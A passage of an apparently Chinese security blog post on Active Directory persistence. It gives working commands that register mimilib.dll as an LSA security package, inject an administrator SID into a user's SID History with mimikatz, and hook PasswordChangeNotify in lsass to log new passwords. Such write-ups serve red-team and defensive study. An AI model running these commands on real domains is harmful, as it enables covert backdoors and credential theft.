+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209135146.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209135146.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209135146.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209135146.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201209135146.png-water_print" /></p>
+<h5 id="2312-通过修改注册表留后门永久">2.3.1.2 通过修改注册表留后门（永久）</h5>
+<p>使用此方法即使系统重启，也不会影响到持久化的效果</p>
+<ol>
+<li>添加 <code>mimilib.dll</code> 到域控 <code>C:\windows\system32</code> 下</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">copy </span><span class="n">mimilib</span><span class="p">.</span><span class="n">dll</span> <span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>注：</strong></p>
+<p>64 位系统要用 64 位的 mimilib.dll，32 位的会失败</p>
+</blockquote>
+<ol start="2">
+<li>设置 SSP</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">reg</span> <span class="n">query</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span><span class="p">\</span><span class="n">currentcontrolset</span><span class="p">\</span><span class="n">control</span><span class="p">\</span><span class="n">lsa</span><span class="p">\</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;Security Packages&#34;</span>
+<span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;hklm\system\currentcontrolset\control\lsa\&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;Security Packages&#34;</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&#34;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&#34;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_MULTI_SZ</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>重启系统</li>
+</ol>
+<p>域控重启后在 <code>c:\windows\system32</code> 可看到新生成的文件 <code>kiwissp.log</code></p>
+<h3 id="24-sid-history-域后门">2.4 SID History 域后门</h3>
+<blockquote>
+<p>每个用户帐号都有一个关联的安全标识符（简称SID），SID 用于跟踪安全主体在访问资源时的帐户与访问权限。为了支持 AD 迁移，微软设计了 SID History 属性，SID History 允许另一个帐户的访问被有效的克隆到另一个帐户。通过 SID History 可让用户拥有不同身份的权限，在单域中同样有效。</p>
+</blockquote>
+<p>SID History 是在域迁移过程中需要使用的一个属性。</p>
+<p>如果将 A 域中的域用户迁移到 B 域中，那么在 B 域中该用户的 SID 会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。</p>
+<p><strong>SID History 的作用是在域迁移过程中保持域用户的访问权限</strong>，即如果迁移后用户的 SID 改变了，系统会将其原来的 SID 添加到迁移后用户的 SID History 属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p>
+<p>使用 mimikatz，可以将 SID History 属性添加到域中任意用户的 SID History 属性中。在实战中，如果获得了域管理员权限，则可以将 SID History 作为实现持久化的方法。</p>
+<h4 id="241-添加-sid-history-后门">2.4.1 添加 SID History 后门</h4>
+<p>打开一个具有域管理员权限的命令行窗口，然后打开 mimikatz，将 administrator 的 SID 添加到 hack 用户的 SID History 属性中。</p>
+<blockquote>
+<p>需要注意的是，在使用 mimikatz 注入 SID 之前，需要使用 sid::patch 命令修复 NTDS 服务，否则无法将高权限的 SID 注入低权限用户的 SID History 属性</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sid::patch&#34;</span> <span class="s2">&#34;sid::add /new:administrator /sam:test&#34;</span> <span class="s2">&#34;exit&#34;</span>
+<span class="c"># 将 administrator 的 SID 添加到 hack 的 SID History 属性中</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="242-查看-sid-history">2.4.2 查看 SID History</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="n">activedirectory</span>
+<span class="nb">Get-ADUser</span> <span class="n">hack</span> <span class="n">-Properties</span> <span class="n">sidhistory</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="243-清除-sid-history">2.4.3 清除 SID History</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sid::patch&#34;</span> <span class="s2">&#34;sid::clear /sam:test&#34;</span> <span class="s2">&#34;exit&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="25-hook-passwordchangenotify">2.5 Hook PasswordChangeNotify</h3>
+<h4 id="251-背景">2.5.1 背景</h4>
+<p>在修改域控密码时会进行如下同步操作：</p>
+<ol>
+<li>当修改域控密码时，LSA 首先调用 PasswordFileter 来判断新密码是否符合密码复杂度要求</li>
+<li>如果符合，LSA 接着调用 PasswordChangeNotify 在系统上同步更新密码</li>
+</ol>
+<p>函数 PasswordChangeNotify 存在于 rassfm.dll</p>
+<p>rassfm.dll 可理解为 Remote Access Subauthentication dll，只存在于在 Server 系统下，xp、win7、win8 等均不存在</p>
+<h4 id="252-特点">2.5.2 特点</h4>
+<ol>
+<li>不需要重启</li>
+<li>不需要修改注册表</li>
+<li>甚至不需要在系统放置dll</li>
+</ol>
+<h4 id="253-实现">2.5.3 实现</h4>
+<h5 id="2531-hook-dll">2.5.3.1 Hook DLL</h5>
+<ol>
+<li>
+<p>为 PasswordChangeNotify 创建一个 inline Hook，将初始函数重定向到 PasswordChangeNotifyHook</p>
+</li>
+<li>
+<p>在 PasswordChangeNotifyHook 中实现记录密码的操作，然后重新将控制权交给 PasswordChangeNotify</p>
+</li>
+</ol>
+<h5 id="2532-dll-注入">2.5.3.2 DLL 注入</h5>
+<p>利用 Powershell tricks 中的 Process Injection 将我们自己编写的 dll 注入到 lsass 进程，实现 Hook 功能</p>
+<p><a href="https://github.com/3gstudent/Hook-PasswordChangeNotify" target="_blank" rel="noopener noreffer">https://github.com/3gstudent/Hook-PasswordChangeNotify</a></p>
+<p>管理员权限执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="n">HookPasswordChangeNotify</span><span class="p">.</span><span class="n">ps1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在 Server 2012 R2 x64 下，手动修改域控密码后
+在 <code>C:\Windows\Temp</code> 下可以找到 passwords.txt，其中记录了新修改的密码</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-12-07</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" data-title="权限维持"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" data-title="权限维持"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" data-title="权限维持"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>,&nbsp;<a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" class="prev" rel="prev" title="HTTP 请求走私"><i class="fas fa-angle-left fa-fw"></i>HTTP 请求走私</a>
+            <a href="/2020/12/ldap-%E5%8D%8F%E8%AE%AE/" class="next" rel="next" title="LDAP 协议相关">LDAP 协议相关<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
